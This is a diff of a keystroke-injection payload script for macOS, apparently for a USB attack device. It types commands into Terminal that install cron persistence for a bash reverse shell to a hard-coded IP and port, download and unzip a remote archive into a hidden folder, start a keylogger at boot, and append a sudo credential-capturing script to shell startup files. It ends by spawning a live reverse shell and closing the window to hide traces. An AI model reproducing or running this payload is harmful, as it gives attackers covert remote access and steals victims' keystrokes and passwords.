@@ -11,36 +11,73 @@ GUI SPACE
 
 REM Search for termina
 STRING terminal
-
+DELAY 300
 ENTER
 
 STRING bash
-
+DELAY 300
 ENTER
+
+ENTER 
 
 REM enable background jobs
 STRING set -m
+DELAY 200
 ENTER
 
 REM add reverse shell to cron
 
 REM set the reverse shell to occur 11am every day
-STRING {crontab -l; echo '0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit';} | crontab -
+STRING { crontab -l; echo '0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit'; } | crontab -
+DELAY 200
 ENTER
+DELAY 200
 
 REM set cron job for keylogger on reboot
-STRING { crontab -l; echo '@reboot python3 ~/.config/Chrome/osx-keylogger.py'; } | crontab -
+STRING { crontab -l; echo '@reboot nuhup python3 ~/.config/Chrome/osx-keylogger.py &'; } | crontab -
+DELAY 200
 ENTER
+DELAY 200
 
 REM download and unzip the scripts
-STRING curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip  
+STRING curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip && unzip ~/.config/Chrome/scripts.zip -d ~/.config/Chrome
+ENTER
+DELAY 200
+
+REM Switch to secret directory
+STRING cd ~/.config/Chrome/
+DELAY 200
+ENTER
+DELAY 200
+
+REM install python modules needed
+STRING pip3 install -r requirements.txt
+DELAY 200
+ENTER
+DELAY 200
+
+REM run the python keylogger
+REM realistically none of this would be done in the initial thing, just the reverse shell but owell
+DELAY 200
+STRING python3 ~/.config/Chrome/osx-keylogger.py &
+DELAY 200
+ENTER
+
+REM add sudo exploit
+REM realistically none of this would be in the initial attack, just the reverse shell but owell
+DELAY 200
+STRING cat ~/.config/Chrome/sudo.sh >> ~/.bashrc && cat ~/.config/Chrome/sudo.sh >> ~/.bash_profile
+DELAY 200
 ENTER
 
 REM spawns a reverse shell in background
-STRING sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit
+DELAY 200
+STRING sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" 
+DELAY 200
 ENTER
 
 REM we were never here!
+DELAY 200
 GUI w
-
+DELAY 200
 ENTER
